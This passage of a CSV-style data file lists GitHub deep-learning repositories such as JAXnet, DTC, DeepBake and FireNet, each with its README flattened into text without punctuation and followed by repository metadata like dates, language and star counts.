and model size python Inb4 MNIST you can use any module with those functions model torch nn Linear 784 10 torchfunc seed 0 frozen torchfunc module freeze model bias False with torchfunc Timer as timer frozen torch randn 32 784 print timer checkpoint Time since the beginning frozen torch randn 128 784 print timer checkpoint Since last checkpoint print f Overall time timer Model size torchfunc sizeof frozen Record and sum per layer activation statistics as data passes through network python Still MNIST but any module can be put in it s place model torch nn Sequential torch nn Linear 784 100 torch nn ReLU torch nn Linear 100 50 torch nn ReLU torch nn Linear 50 10 Recorder which sums all inputs to layers recorder torchfunc hooks recorders ForwardPre reduction lambda x y x y Record only for torch nn Linear recorder children model types torch nn Linear Train your network normally or pass data through it Activations of all neurons of first layer print recorder 1 You can also post process this data easily with apply For other examples and how to use condition see documentation https szymonmaszke github io torchfunc wrench Installation snake pip Latest release shell pip install user torchfunc Nightly shell pip install user torchfunc nightly whale2 Docker https cloud docker com repository docker szymonmaszke torchfunc CPU standalone and various versions of GPU enabled images are available at dockerhub https cloud docker com repository docker szymonmaszke torchfunc For CPU quickstart issue shell docker pull szymonmaszke torchfunc 18 04 Nightly builds are also available just prefix tag with nightly If you are going for GPU image make sure you have nvidia docker https github com NVIDIA nvidia docker installed and it s runtime set question Contributing If you find any issue or you think some functionality may be useful to others and fits this library please open new Issue https help github com en articles creating an issue or create Pull Request https help github com en articles creating a pull request from a fork To get an overview of things one can do to help this project see Roadmap https github com szymonmaszke torchfunc blob master ROADMAP md,2019-09-16T00:25:53Z,2019-12-01T16:33:26Z,Python,szymonmaszke,User,2,146,4,50,master,szymonmaszke#ImgBotApp,2,2,2,0,2,0,5
JuliusKunze,jaxnet,data-science#deep-learning#jax#machine-learning#neural-networks#python,JAXnet Build Status https travis ci org JuliusKunze jaxnet svg branch master https travis ci org JuliusKunze jaxnet JAXnet is a deep learning library based on JAX https github com google jax JAXnet s functional API provides unique benefits over TensorFlow2 Keras and PyTorch while maintaining user friendliness modularity and scalability More robustness through immutable weights no global compute graph GPU compiled numpy code for networks training loops pre and postprocessing Regularization and reparametrization of any module or whole networks in one line No global random state flexible random key control If you already know stax read this STAX md Modularity python net Sequential Dense 1024 relu Dense 1024 relu Dense 4 logsoftmax creates a neural net model from predefined modules Extensibility Define your own modules using parametrized functions You can reuse other modules python from jax import numpy as np parametrized def loss inputs targets return np mean net inputs targets All modules are composed in this way jax numpy https github com google jax whats supported is mirroring numpy meaning that if you know how to use numpy you know most of JAXnet Compare this to TensorFlow2 Keras python import tensorflow as tf from tensorflow keras import Sequential from tensorflow keras layers import Dense Lambda net Sequential Dense 1024 relu Dense 1024 relu Dense 4 Lambda tf nn logsoftmax def loss inputs targets return tf reducemean net inputs targets Notice how Lambda layers are not needed in JAXnet relu and logsoftmax are plain Python functions Immutable weights Different from TensorFlow2 Keras JAXnet has no global compute graph Modules like net and loss do not contain mutable weights Instead weights are contained in separate immutable objects They are initialized with initparameters provided example inputs and a random key python from jax random import PRNGKey def nextbatch return np zeros 3 784 np zeros 3 4 params loss initparameters nextbatch key PRNGKey 0 print params sequential dense2 bias 0 01101029 0 00749435 0 00952365 0 00493979 Instead of mutating weights inline optimizers return updated versions of weights They are returned as part of a new optimizer state and can be retrieved via getparameters python opt optimizers Adam state opt init params for in range 10 state opt update loss apply state nextbatch accelerate with jit True trainedparams opt getparameters state apply evaluates a network python testloss loss apply trainedparams testbatch accelerate with jit True GPU support and compilation JAX allows functional numpy scipy code to be accelerated Make it run on GPU by replacing your numpy import with jax numpy Compile a function by decorating it with jit https github com google jax compilation with jit This will free your function from slow Python interpretation parallelize operations where possible and optimize your compute graph It provides speed and scalability at the level of TensorFlow2 or PyTorch Due to immutable weights whole training loops can be compiled run on GPU demo examples mnistvae py L96 jit will make your training as fast as mutating weights inline and weights will not leave the GPU You can write functional code without worrying about performance You can easily accelerate numpy scipy pre postprocessing code in the same way demo examples mnistvae py L61 Regularization and reparametrization In JAXnet regularizing a model can be done in one line demo examples wavenet py L167 python loss L2Regularized loss scale 1 loss is now just another module that can be used as above Reparametrized layers are one liners too see API API md regularization and reparametrization JAXnet allows regularizing or reparametrizing any module or subnetwork without changing its code This is possible because modules do not instantiate any variables Instead each module provides a function apply with parameters as an argument This function can be wrapped to build layers like L2Regularized In contrast TensorFlow2 Keras PyTorch have mutable variables baked into their model API They therefore require Regularization arguments on layer level with separate code necessary for each layer Reparametrization arguments on layer level and separate implementations for each https www tensorflow org probability apidocs python tfp layers DenseReparameterization layer https www tensorflow org probability apidocs python tfp layers Convolution1DReparameterization Random key control JAXnet does not have global random state Random keys are provided explicitly making code deterministic and independent of previously executed code by default This can help debugging and is more flexible demo examples mnistvae py L81 Read more on random numbers in JAX here https github com google jax random numbers are different Step by step debugging JAXnet allows step by step debugging with concrete values like any plain Python function when jit https github com google jax compilation with jit compilation is not used API and demos Find more details on the API here API md See JAXnet in action in your browser Mnist Classifier https colab research google com drive 18kICTUbjqnfg5Lk3xFVQtUj6ahct9Vmv Mnist VAE https colab research google com drive 19web5SnmIFglLcnpXE34phiTY03v39 g OCR with RNNs https colab research google com drive 1YuI6GUtMgnMiWtqoaPznwAiSCe9hMR1E ResNet https colab research google com drive 1q6yoKZscv 57ZzPM4qNy3LgjeFzJ5xN WaveNet https colab research google com drive 111cKRfwYX4YFuPH3FF4V46XLfsPG1icZ PixelCNN https colab research google com drive 1DMRbUPAxTlk0Awf3DHR3Oz3P3MBahaJ and Policy Gradient RL https colab research google com drive 171timtUnCOOAsc eKoC2TjHK9dQFrY7B Installation PyPI https img shields io pypi v jaxnet svg https pypi python org pypi jaxnet history This is a preview Expect breaking changes Install with pip3 install jaxnet To use GPU first install the right version of jaxlib https github com google jax installation Questions Please feel free to create an issue on GitHub,2019-08-11T01:13:00Z,2019-12-04T13:38:28Z,Python,JuliusKunze,User,10,132,11,249,master,JuliusKunze,1,0,0,1,21,0,0
leopd,geometric-intuition,n/a,Geometric Intuition for Deep Learning I find machine learning ML and deep learning much easier to understand when I think about geometry than equations I can gain intuition by reasoning about points and the distances between them loss surfaces manifolds and hyper planes Here s a collection of resources to understand ML in this way High dimensional spaces High dimensional spaces often behave in counter intuitive ways compared to the 2 D or 3 D spaces that we typically engage with Dive in high dimensionality to some of those differences Explaining ML models On 21 Aug 2019 i gave a talk on Explaining ML models The explainability explainability directory includes the notebooks I used to generate the charts and equations for this talk Note about python 3 Everything here is written for python 3 only If you re still using python 2 7 please please stop Python 2 7 is at the end of its life and will soon not even receive critical security updates At this point in time the year 2019 it is actually irresponsible to write code in python 2 7 because you are enabling people to deploy systems that will not be secure which could lead to actual real world harm So if the team you re on still hasn t upgraded take a moment to consider all the bad things that could happen if hackers got into your code and there was literally nothing you could do to stop them except turn off your system or spend weeks or months upgrading to python 3 So get ahead of that now Plus you get nice things like type hints https docs python org 3 library typing html and f strings https realpython com python f strings which make the code easier to read,2019-08-21T20:56:15Z,2019-11-26T19:48:53Z,Jupyter Notebook,leopd,User,6,111,10,2,master,leopd,1,0,0,2,0,0,0
wenmin-wu,jupyter-tabnine,n/a,TabNine for Jupyter Notebook Readthisinotherlanguages English README md README ch md jupyter tabnine images demo gif This extension for Jupyter Notebook enables the use of coding auto completion based on Deep Learning Other client plugins of TabNine require starting a child process for TabNine binary and using Pipe for communication This cant be done with Jupyter Notebook since child process cant be created with JQuery and Jupyter Notebook doesnt provide any way for adding third part js libs to plugins In this repository it is achived by developing a client plugin and a server plugin for Jupyter Notebook The client plugin generate request info and send http request to the server plugin The server plugin pass the request info to its client process TabNine and return the request to client plugin Installation The extension consists of a pypi package that includes a javascript notebook extension along with a python jupyter server extension Since Jupyter 4 2 pypi is the recommended way to distribute nbextensions The extension can be installed from the master version on the github repo this will be always the most recent version via pip for the version hosted on pypi From the github repo or from Pypi 1 install the package pip3 install https github com wenmin wu jupyter tabnine archive master zip user upgrade or pip3 install jupyter tabnine user upgrade or clone the repo and install git clone https github com wenmin wu jupyter tabnine git python3 setup py install 2 install the notebook extension jupyter nbextension install py jupytertabnine user sys prefix system 3 and enable notebook extension and server extension Bash jupyter nbextension enable py jupytertabnine user sys prefix system jupyter serverextension enable py jupytertabnine user sys prefix system For Jupyter versions before 4 2 the situation after step 1 is more tricky since the py option isnt available so you will have to find the location of the source files manually as follows instructions adapted from jcb91 https github com jcb91 s jupyterhighlightselectedword Execute Python python c import os path as p from jupytertabnine import file as f jupyternbextensionpaths as n print p normpath p join p dirname f n 0 src Then issue Bash jupyter nbextension install jupyter nbextension enable jupytertabnine main jupyter serverextension enable where is the output of the first python command Usage Jupyter TabNine will be active after being installed Sometimes you may want to show the Jupyter original complete temporally then click shift space show original complete demo images show original complete gif Remote auto completion server is also supported You may want this to speed up the completion request handing Or maybe your company want to deploy a compeltion server cluster that services everyone Read following to learn how to deploy remote server Contributing Pull requests are welcome For major changes please open an issue first to discuss what you would like to change Please make sure to update tests as appropriate License GNU General Public License v3 0 LICENSE Remote Completion Server Deployment,2019-09-07T00:30:49Z,2019-12-14T11:31:01Z,JavaScript,wenmin-wu,User,4,106,14,61,master,wenmin-wu,1,0,0,8,2,0,1
lessw2020,mish,n/a,mish Mish Deep Learning Activation Function for PyTorch FastAI,2019-08-26T18:18:33Z,2019-12-13T19:39:37Z,Jupyter Notebook,lessw2020,User,6,92,18,14,master,lessw2020#e-sha,2,0,0,1,0,0,2
dongminlee94,deep_rl,deep-reinforcement-learning#model-free-rl#pytorch#pytorch-rl#reinforcement-learning,Deep Reinforcement Learning DRL Algorithms with PyTorch This repository contains PyTorch implementations of deep reinforcement learning algorithms This implementation uses PyTorch For a TensorFlow implementation of algorithms take a look at tsallisactorcriticmujoco https github com rllab snu tsallisactorcriticmujoco Algorithms Implemented 1 Deep Q Network DQN V Mnih et al 2015 https storage googleapis com deepmind media dqn DQNNaturePaper pdf 2 Double DQN DDQN H Van Hasselt et al 2015 https arxiv org abs 1509 06461 3 Advantage Actor Critic A2C 4 Vanilla Policy Gradient VPG 5 Natural Policy Gradient NPG S Kakade et al 2002 http papers nips cc paper 2073 a natural policy gradient pdf 6 Trust Region Policy Optimization TRPO J Schulman et al 2015 https arxiv org abs 1502 05477 7 Proximal Policy Optimization PPO J Schulman et al 2017 https arxiv org abs 1707 06347 8 Deep Deterministic Policy Gradient DDPG T Lillicrap et al 2015 https arxiv org abs 1509 02971 9 Twin Delayed DDPG TD3 S Fujimoto et al 2018 https arxiv org abs 1802 09477 10 Soft Actor Critic SAC T Haarnoja et al 2018 https arxiv org abs 1801 01290 11 Automating entropy adjustment on SAC ASAC T Haarnoja et al 2018 https arxiv org abs 1812 05905 12 Tsallis Actor Critic TAC K Lee et al 2019 https arxiv org abs 1902 00137 13 Automating entropy adjustment on TAC ATAC Environments Implemented 1 CartPole v1 as described in here https gym openai com envs CartPole v1 2 Pendulum v0 as described in here https gym openai com envs Pendulum v0 3 MuJoCo environments HalfCheetah v2 Ant v2 Humanoid v2 etc as described in here https gym openai com envs mujoco Results CartPole v1 Observation space 4 Action space 2 Pendulum v0 Observation space 3 Action space 1 HalfCheetah v2 Observation space 17 Action space 6 Ant v2 Observation space 111 Action space 8 Humanoid v2 Observation space 376 Action space 17 Requirements PyTorch https pytorch org get started locally TensorBoard https pytorch org docs stable tensorboard html gym https github com openai gym mujoco py https github com openai mujoco py Usage The repository s high level structure is agents common results data graphs tests savemodel 1 To train the agents on the environments To train all the different agents on MuJoCo environments follow these steps commandline git clone https github com dongminlee94 deeprl git cd deeprl python runmujoco py For other environments change the last line to runcartpole py runpendulum py If you want to change configurations of the agents follow this step commandline python runmujoco py env Humanoid v2 algo atac seed 0 iterations 200 stepsperiter 5000 maxstep 1000 2 To watch the learned agents on the above environments To watch all the learned agents on MuJoCo environments follow these steps commandline cd tests python mujocotest py load envnamealgoname You should copy the saved model name in tests savemodel envnamealgoname and paste the copied name in envnamealgoname So the saved model will be load,2019-09-17T07:12:40Z,2019-12-15T03:32:08Z,Python,dongminlee94,User,4,81,9,123,master,dongminlee94,1,0,0,0,0,0,0
k-han,DTC,n/a,DTC Learning to Discover Novel Visual Categories via Deep Transfer Clustering ICCV 2019 http www robots ox ac uk vgg research DTC Kai Han http www hankai org Andrea Vedaldi http www robots ox ac uk vedaldi Andrew Zisserman http www robots ox ac uk az Dependencies Python version 2 7 15 PyTorch version 1 0 1 Numpy version 1 15 4 scikit learn version 0 20 1 tqdm version 4 28 1 Overview We provide code and models for all our experiments on ImageNet OmniGlot CIFAR 100 CIFAR 10 and SVHN Pretrained initialization models with supervised learning Trained models of deep transfer clustering DTC Supervised pretraining code DTC code Novel category number estimation code Data preparation By default we put the data in data datasets soft link is suggested You may also use any path you like by setting the datasetroot argument to your path For CIFAR 10 CIFAR 100 and SVHN simply download the datasets and put into data datasets For OmniGlot after downloading you need to put AlphabetoftheMagi Japanese katakana Latin Cyrillic Grantha from imagsbackground folder into imagesbackgroundval folder and put the rest alphabets into imagesbackgroundtrain folder For ImageNet we provide the exact split files used in the experiment following existing work To download the split files run the command shell sh scripts downloadimagenetsplits sh Pretrained models We provide all our pretrained models supervised initialization models DTC models 13G To download run the command shell sh scripts downloadpretrainedmodels sh Note that our results on all datasets are averaged over 10 runs except ImageNet which is averaged over 3 runs using different unlabelled subsets following existing work All our trained models are provided and the detailed results of each run are also included in the txt files in each subfolder Initialization supervised learning with labelled data We provide our pretrained initialization models used in our DTC experiments If you have downloaded all our pretrained models by running sh scripts downloadpretrainedmodels sh the pretrained initialization models are placed in data experiments pretrained Alternatively if you only want to download the initialization models 236M and do not need the pretrained DTC models run the command shell sh scripts downloadinitpretrained sh If you would like to train the initialization model with labelled data run the commands shell Train CIFAR 10 with the 5 labelled classes CUDAVISIBLEDEVICES 0 python cifar10classif py Train CIFAR 100 with the 80 labelled classes CUDAVISIBLEDEVICES 0 python cifar100classif py Train SVHN with the 5 labelled classes CUDAVISIBLEDEVICES 0 python svhnclassif py Train ImageNet with the 800 labelled classes CUDAVISIBLEDEVICES 0 python imagenetclassif py Train OmniGlot with the labelled classes with prototypical loss CUDAVISIBLEDEVICES 0 python omniglotproto py DTC training known number of novel categories After having the supervised pretrained model initialization of DTC you could run the DTC code on unlabelled data of novel categories To reproduce exactly the same numbers as in our paper you are suggested to use the pretrained initialization models downloaded above To train the DTC model on CIFAR 10 run the commands shell Single run demo DTC PI CUDAVISIBLEDEVICES 0 python cifar10DTC py Train DTC Baseline 10 runs CUDAVISIBLEDEVICES 0 sh scripts cifar10DTCBaseline10runs sh Train DTC PI 10 runs CUDAVISIBLEDEVICES 0 sh scripts cifar10DTCPI10runs sh Train DTC TE 10 runs CUDAVISIBLEDEVICES 0 sh scripts cifar10DTCTE10runs sh Train DTC TEP 10 runs CUDAVISIBLEDEVICES 0 sh scripts cifar10DTCTEP10runs sh To train DTC model on other datasets i e ImageNet OmniGlot CIFAR 100 and SVHN just replace cifar10 in the above commands by imagenet omniglot cifar100 and svhn For experiments of transferring from ImageNet to CIFAR 10 replace cifar10 in the above commands by imagenet2cifar Estimating the number of novel categories To estimate the number of novel categories run the commands shell For OmniGlot CUDAVISIBLEDEVICES 0 python omniglotestk py For ImageNet subset A CUDAVISIBLEDEVICES 0 python imagenetestk py subset A For ImageNet subset B CUDAVISIBLEDEVICES 0 python imagenetestk py subset B For ImageNet subset C CUDAVISIBLEDEVICES 0 python imagenetestk py subset C For CIFAR 100 CUDAVISIBLEDEVICES 0 python cifar100estk py DTC training unknown number of novel categories shell Single run demo on OmniGlot CUDAVISIBLEDEVICES 0 python omniglotDTCunknown py OmniGlot 10 runs CUDAVISIBLEDEVICES 0 sh scripts omniglotDTCunknown10runs sh ImageNet subset A using our estimated category numbers CUDAVISIBLEDEVICES 0 python imagenetDTC py subset A nclusters 34 ImageNet subset B using our estimated category numbers CUDAVISIBLEDEVICES 0 python imagenetDTC py subset B nclusters 31 ImageNet subset C using our estimated category numbers CUDAVISIBLEDEVICES 0 python imagenetDTC py subset C nclusters 32 Citation If this work is helpful for your research please cite our paper inproceedingsHan2019learning author Kai Han and Andrea Vedaldi and Andrew Zisserman title Learning to Discover Novel Visual Categories via Deep Transfer Clustering booktitle International Conference on Computer Vision ICCV date 2019 Acknowledgments We are grateful to EPSRC Programme Grant Seebibyte EP M013774 1 http seebibyte org and ERC StG IDIU 638009 https cordis europa eu project rcn 196773 factsheet en for support,2019-08-12T09:14:36Z,2019-12-12T14:10:55Z,Python,k-han,User,5,73,5,1,master,k-han,1,0,0,1,0,0,0
aianaconda,TensorFlow_Engineering_Implementation,n/a,TensorFlowEngineeringImplementation The source code and dataset about ltDeep Learning Best Practices on TensorFlow Engineering Implementation Image text https github com aianaconda TensorFlowEngineeringImplementation blob master 2 jpg TensorFlow www aianaconda com AITensorFlow 1 x2 0 74075TFTSTFtf kerastfRecorderDatasetTFservingsavedmodelTFlitecleverhans 1 AIURLIOS 2 Mask R CNN YOLO V3PNASNet QRNN SRU IndRnnIndyLSTM JANET30 3 TensorFlow TensorFlow TFDS TensorFlow1 xTensorFlow2 x dropoutTargeted Dropout BahdanauAttention LuongAttention ReNormLayerNorminstancenormGroupNormSwitchableNorm RNN Seq2Seq AIFGSM URLIOS TF slimTF HubT2Ttf layerstf jsTFDStf KerasTFLearntfdbgTraining HooksEstimatorseagerTFCONFIGKubeFlowtf featurecolumnsequencefeaturecolumnTFBT factorizationLatticetf Transformwals kmeans BoostedTreesTextCnnResNetPNASNetVGGYOLO V3Mask R CNNTargeted DropoutQRNN SRU IndRnnIndyLSTM JANET Seq2SeqTFTS TacotronTFGanBahdanauAttention LuongAttention stftReNormLayerNorminstancenormGroupNormSwitchableNormFGSMcleverhans JacobiandefunTFserving savedmodel TFlite Image text https github com aianaconda TensorFlowEngineeringImplementation blob master 36 jpg qq www aianaconda com bbs aianaconda com www aianaconda com AI Image text https github com aianaconda TensorFlowEngineeringImplementation blob master 1 jpg Image text https github com aianaconda TensorFlowEngineeringImplementation blob master 9 png,2019-08-08T04:26:35Z,2019-12-15T03:23:08Z,Python,aianaconda,User,2,64,26,18,master,aianaconda,1,0,0,0,0,0,0
dantaki,DeepBake,deep-learning#gbbo#great-british-bake-off#great-british-baking-show#machine-learning,DeepBake Baking Machine Learning into Great British Bake Off crystalball Season 10 Predictions https github com dantaki DeepBake season 10 week 9 predictions crystalball Standings Going into the Final Probability results from Week 9 Baker Winner Finalist 3rd 4th Place David 29 69 22 Steph 25 97 2 Alice 22 98 1 GBBO Winner running probability GBBO Finalist running probability 3rd 4th Place running probability What is this DeepBake is a set of deep learning neural network models to predict the final rankings of GBBO contestants DeepBake consists of 10 models for each episode and was trained on data from seasons 2 9 Data include 8 variables Technical Challenge Ranking for that week and running mean from prior weeks Contestant was Star Baker and running mean of times named Star Baker Contestant was a favorite baker that week and running mean from prior weeks Contestant was an unfavored baker that week and the running mean Data were obtained from Wikipedia https en wikipedia org wiki TheGreatBritishBakeOff Thanks to those who made those pages Data were then quantile scaled to fit a normal distribution Does this work DeepBake s performance was measured using a Leave One Out method One season was set aside for evaluation while training the model on using the remaining seasons A mean receiver operating curve was calculated by iterating through all seasons The closer the area under the curve AUC is to 1 the more accurate the model Random chance of making a correct prediction has an AUC of 0 5 dotted diagonal line The Episode 4 model has an AUC of 0 91 0 04 95 Confidence Interval meaning it has a very good chance of predicting the final GBBO winner DeepBake makes 5 predictions 1st Place trophy trophy Runner Up trophy 3rd 4th Place 5th 7th Place 8th Place and Below The evaluation was measured using this tiered class system Note how the classifier gets better at predicting as the season progresses This makes sense because the good bakers rise to the top favored and star bakers and historical data are recorded as running means Does this mean DeepBake can predict the winner for Season 10 Absolutely Here are the current standings Season 10 Week 9 Predictions SEMIFINALS and DeepBake did well this time correctly predicting Rosie woud get the boot with an 80 chance of placing in 3rd 4th place So the question remains Who is going to win GBBO Here s a table of the current standings Let s consider all the probabilities listed here Baker Winner Finalist 3rd 4th Place David 29 69 22 Steph 25 97 2 Alice 22 98 1 David has the highest chance of winning GBBO but he also given a much higher score for 3rd 4th place than the other two bakers He is also given a much lower score for being a Finalist than the other two bakers Steph has been solid for the entire serires but has recently declined in standings I think Steph is the safe bet while Alice is the Dark Horse Alice s chance to win has bounced around https github com dantaki DeepBake gbbo winner running probability quite a bit which makes her less of a safe bet But she has come on top in many weeks So do the judges really consider all previous bakes too as they claim If they do I think it s clear David or Steph will win GBBO David has a real chance of winning since he has caught up to the juggernaut that is Steph However David has also fudged the rules sometimes I mean a pie without a cover Really mate Steph has won Star Baker 4 times while David has never been graced by that honor There has never been a GBBO winner that has not won Star Baker Just let that bake for a minute Season 10 Week 8 Predictions Pastry week did not go well for the bakers nearly everyone had some problems in the signature or in the technical cough Steph or at the showstopper What does this mean for David who rocked the obscure Moroccan technical Well now he is in the lead for winning GBBO at a 22 chance while Steph dropped down to 21 Still neck and neck for those two As for the rest of the pack Henry and Alice swapped places again now Alice is poised to be a GBBO Finalist 75 as opposed to Henry s 75 chance he got at week 7 In fact Henry left the tent this week and DeepBake did not predict it Giving Rosie the highest chance of placing 3rd through 4th place with 89 probability Henry was close to follow with a 70 chance So in defense of DeepBake it has correctly predicted who will leave given the highest or second highest odds to leave for every week thus far Stay tuned for next week the semi final and see if DeepBake has correctly pegged who will be a GBBO finalist Will it be Steph David and Alice or will DeepBake Season 10 Week 7 Predictions If you wanna be a GBBO winner you gotta make consistent bakes And that s something Alice needs to work on if she wants to make it to the final She did not do well in the Signature and the Technical plummeting her odds to win GBBO As the wheel of fortune turns downward for Alice it raised Henry up from a 20 chance last week to 75 chance this week to bake in the final As for predicting who will leave the tent DeepBake missed this one It thought Rosie would leave with a 66 chance but Michael was the unlucky baker who was eliminated His chance to leave was pegged at 43 second to leave according to DeepBake Now DeepBake has predicted 6 out of the 8 bakers who would leave which is a 75 chance of getting this prediction correct This is not so bad but hopefully DeepBake can do better even though Micheal was predicted next to leave after Rosie Steph is still solidly leading the GBBO winner odds with 40 chance to win following her is David with 35 chance and then Henry with a 24 chance It seems the spread between Steph and David is closing in as the bakers inch toward the final What I find intriguing is how the 3rd 4th place category is not lateral compared to last week Now Alice is leading this group with 34 chance to place in either 3rd or 4th place This means DeepBake thinks she will not get eliminated next week but will not bake in the final Henry and Alice who are lovebirds by the way are not consistent bakers which makes their chance of winning less believable than Steph or David However I think we can all agree that Rosie will likely leave the tent next week Season 10 Week 6 Predictions Well lads it happened Priya has left the tent DeepBake gave her a whopping 81 to place in 5th 7th place Rosie is next with 65 and Henry with a 59 chance Alice had a great week 6 winning the technical and being favored by the judges Her chances to win GBBO has rocketed to 35 from 8 last week She is behind Steph 42 who has solidly secured star baker for three weeks in a row DeepBake s predictions for 3rd and 4th place are lateral for the bakers but perhaps this is expected since evident by the first three weeks of baking for 5th to 7th place https github com dantaki DeepBake 5th 7th place running probability DeepBake seems to be on a roll or a bap it has predicted who will leave 6 out of 7 times which is 86 accuracy close to the 90 estimate I made on reddit https www reddit com r dataisbeautiful comments d3q51c ocibakedupadeepneuralnetworktopredict Season 10 Week 5 Predictions First off I realize I have been using finalist incorrectly now I have labeled plots as GBBO Winner and GBBO Finalist The finalist probability is the chance a baker will compete in the final week This week my wife and I paused the show right after Steph was announced star baker and ran the model with the new data Steph has been starbaker twice and been favored by the judges for two other weeks Therefore her standings as a GBBO finalist and series winner is gaining ground with a 46 and 77 chance respectively For the outright winner Henry is next in line with a 28 chance and then is David with 17 Likewise David is next in line to be a finalist with 70 probability Then comes Michael 60 Last week DeepBake thought Michael would be next on the chopping block with Henry but both bakers are doing well this week When it comes to predicting who will leave next week DeepBake made some misses but also some hits As I mentioned my wife and I entered the new data into the model after Steph was crowned star baker to predict who would leave This week it was obvious two bakers had to go so looking at the model Priya was heads above all with 27 chance of leaving Following her was Helena with 15 chance to leave The chances for the remaining bakers quickly decay with probabilities less than 3 Priya was not eliminated but you have to admit she probably should have been Helena was eliminated and so was Michelle If we look at the 5th to 7th place predictions which we should since we are at the point of the series to use that score to predict who might leave the tent we see Michelle and Helena with 71 and 63 probability respectively Next up is Pryia with a 55 chance to leave Rosie and Alice tail her with 36 and 33 chances Season 10 Week 4 Predictions What can I say even Neural Networks make mistakes The top baker prediction now thinks Rosie is in the lead with 23 chance with Alice following behind her with a 18 chance Something about Alice is really making the model put her at the top which I don t really agree with Anyhoo the finalist top 3 bakers predictions seem to make more sense with Steph 75 David 64 and Rosie 43 Alice is still up there and so is Michael As for the bottom bakers last week the model said Henry had a good chance of leaving and he did have some pretty hard bakes in week 4 However Phil was eliminated and the week 3 model did not put him anywhere near the bottom So DeepBake got it wrong in week 3 But the week 4 predictions put him right at the bottom which means if I were to pause the show right after the judges reveal who is star baker and input all the data needed for DeepBake the model would have made a correct prediction that Phil would leave Henry is slated to leave again with a 30 chance not sure why Henry is not favored by the model too Oddly Michael is right behind him probably because he got an unfavorable status from the judges in week 4 Priya is next and so is Michelle which makes sense to me Season 10 Week 3 Predictions DeepBake now thinks Alice hasn t proven herself and her standing has slid to danger territory week 2 https github com dantaki DeepBake blob master README md finalist prediction David is now the most likely winner and Steph jumped up in the rankings As for the finalists top 3 bakers Michael has a 67 chance of baking in the final DeepBake thinks Steph has a 59 chance and David a 47 chance DeepBake in week 2 gave Amelia a 48 of being in the bottom tier right behind the two eliminated bakers Dan and Jamie In week 3 Amelia was eliminated which is bad news for her but great news for DeepBake For remaining bakers in week 3 Amelia was at the top of the ranking for the bottom tier with a 43 probabiliy Next is Henry winner of the bap technical with a 36 probability Following him is a tight pack led by Priya with Helena Michelle and Alice following her all with probability scores between 23 20 Season 10 Week 2 Predictions Finalist Prediction DeepBake puts Alice in the lead with a 36 8 probability score for being the finalist Michael David and Rosie are close contenders with around 21 probability Finalist Runner Up This score is the addition of the finalist probability and the runner up probability It s a measurement of how likely a baker would be in the final episode DeepBake thinks Alice 87 David 62 and Michael 60 will vie for the title of best baker 8th and Below DeepBake gave Dan and Jamie the highest scores 80 and 78 for being in the bottom tier Dan was eliminated in week 1 while Jamie was eliminated at the end of episode 2 In fact DeepBake can make a prediction before the judges eliminate a baker These results suggest DeepBake correctly predicted Jamie would leave the tent Stay tuned for Week 4,2019-09-07T20:28:47Z,2019-11-21T06:24:34Z,Jupyter Notebook,dantaki,User,7,61,5,59,master,dantaki,1,0,0,0,0,0,0
OlafenwaMoses,FireNET,n/a,FireNet FireNet is an artificial intelligence project for real time fire detection FireNet is a real time fire detection project containing an annotated dataset pre trained models and inference codes all created to ensure that machine learning systems can be trained to detect fires instantly and eliminate false alerts This is part of DeepQuest AI s to train machine learning systems to perceive understand and act accordingly in solving problems in any environment they are deployed This is the first release of the FireNet It contains an annotated dataset of 502 images splitted into 412 images for training and 90 images for validation DOWNLOAD TRAINING AND DETECTION The FireNet dataset is provided for download in the release section of this repository You can download the dataset via the link below https github com OlafenwaMoses FireNET releases download v1 0 fire dataset zip We have also provided a ImageAI https github com OlafenwaMoses ImageAI codebase to train a YOLOv3 detection model on the images and perform detection in mages and videos using a pre trained model also using YOLOv3 provided in the release section of this repository The python codebase is contained in the firenet py file and the detection configuration JSON file for detection is also provided the detectionconfig json The pretrained YOLOv3 model is available for download via the link below https github com OlafenwaMoses FireNET releases download v1 0 detectionmodel ex 33 loss 4 97 h5 Running the experiment or detection requires that you have Tensorflow and Keras OpenCV and ImageAI installed You can install this dependencies via the commands below Tensorflow 1 4 0 and later versions Install or install via pip pip3 install upgrade tensorflow OpenCV Install or install via pip pip3 install opencv python Keras 2 x Install or install via pip pip3 install keras ImageAI 2 0 3 pip3 install imageai upgrade Video Prediction Results Click below to watch the video demonstration of the trained model at work References 1 Joseph Redmon and Ali Farhadi YOLOv3 An Incremental Improvement https arxiv org abs 1804 02767,2019-08-18T15:42:30Z,2019-12-14T13:31:14Z,Python,OlafenwaMoses,User,5,55,20,3,master,OlafenwaMoses,1,1,1,2,1,0,0
chsasank,image_features,computer-vision#deep-learning#feature-extraction#image-classification#image-processing,Deep Learning Image Embeddings Features That Work You are looking for generic image features for 1 Image classification 2 Image retrieval 3 Image similarity and so on Sometimes you are not looking for latest and greatest You just need something that just works With imagefeatures you can extract such deep learning based features from images in a single line of code python from imagefeatures import imagefeatures features imagefeatures yourimage1 png yourimage2 jpg You can use these features to train a scikit learn classification model python from sklearn import linearmodel from imagefeatures import imagefeatures Xtrain imagefeatures yourimage1 png yourimage2 jpg ytrain cat dog clf linearmodel LogisticRegression clf fit Xtrain ytrain Package internally uses PyTorch and imagenet pretrained deep learning model like resnet50 https arxiv org abs 1512 03385 default Install pip install U git https github com chsasank imagefeatures git Tutorial I have written an accompanying tutorial https chsasank github io deep learning image features html to help you get started https storage googleapis com public sasank imagefeaturestutorial png Aim Inspired by facerecognition https github com ageitgey facerecognition and how it just works most of the time Simple yet fairly complete implementation If there is enough interest in this put on pypi,2019-08-31T15:35:11Z,2019-12-04T08:51:21Z,Python,chsasank,User,2,54,8,3,master,chsasank,1,0,0,0,1,0,0
